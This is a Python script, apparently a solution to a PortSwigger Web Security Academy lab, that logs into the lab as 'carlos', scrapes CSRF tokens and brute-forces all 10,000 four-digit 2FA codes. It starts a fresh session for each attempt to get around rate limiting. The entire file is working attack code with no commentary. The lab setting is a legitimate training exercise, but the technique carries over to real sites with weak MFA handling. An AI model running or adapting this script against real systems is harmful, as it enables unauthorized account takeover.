import requests
import urllib3

urllib3.disable_warnings()

TARGET = "https://0acd00f804f812d58094cc95005700c4.web-security-academy.net/"
USERNAME = "carlos"
PASSWORD = "montoya"

def get_session_with_csrf():
    """Start fresh session, login, and return session parked at /login2"""
    session = requests.Session()
    session.verify = False

    # Step 1: GET /login -> grab CSRF token
    r = session.get(f"{TARGET}/login")
    csrf = r.text.split('name="csrf" value="')[1].split('"')[0]

    # Step 2: POST /login
    r = session.post(f"{TARGET}/login", data={
        "csrf": csrf,
        "username": USERNAME,
        "password": PASSWORD,
    }, allow_redirects=True)

    # Step 3: GET /login2 -> grab 2FA page CSRF
    r = session.get(f"{TARGET}/login2")
    csrf2 = r.text.split('name="csrf" value="')[1].split('"')[0]

    return session, csrf2


def try_code(code: str) -> bool:
    """Returns True if we successfully bypassed 2FA."""
    session, csrf2 = get_session_with_csrf()

    code_str = str(code).zfill(4)
    r = session.post(f"{TARGET}/login2", data={
        "csrf": csrf2,
        "mfa-code": code_str,
    }, allow_redirects=False)

    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
        print(f"\n[+] SUCCESS! Code: {code_str}")
        print(f"[+] Redirect: {r.headers['Location']}")
        return True

    return False


def main():
    print(f"[*] Brute-forcing 2FA for {USERNAME}@{TARGET}")
    print("[*] Re-authenticating on every attempt (rate-limit bypass)\n")

    for code in range(10000):
        code_str = str(code).zfill(4)
        print(f"\r[*] Trying: {code_str}", end="", flush=True)

        if try_code(code):
            break
    else:
        print("\n[-] All codes exhausted. Lab code may have rotated — rerun the script.")


if __name__ == "__main__":
    main()